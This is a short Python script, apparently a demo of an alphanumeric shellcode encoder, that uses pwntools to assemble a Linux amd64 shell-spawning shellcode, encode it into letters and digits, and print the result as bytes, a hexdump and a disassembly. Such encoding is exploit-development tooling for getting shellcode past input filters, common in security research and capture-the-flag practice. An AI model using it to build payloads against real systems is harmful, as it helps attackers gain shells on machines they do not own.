import pwn
from encoder import encode

pwn.context.arch = "amd64"
alphanum_pool = b"UVWXYZABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrstuvwxyz0123456789"

if __name__ == "__main__":
    sh = pwn.asm(pwn.shellcraft.amd64.linux.sh())
    e = encode(shellcode=sh, base_reg="rax", offset=0)
    print(e)
    print(pwn.hexdump(e))
    print(pwn.disasm(e))
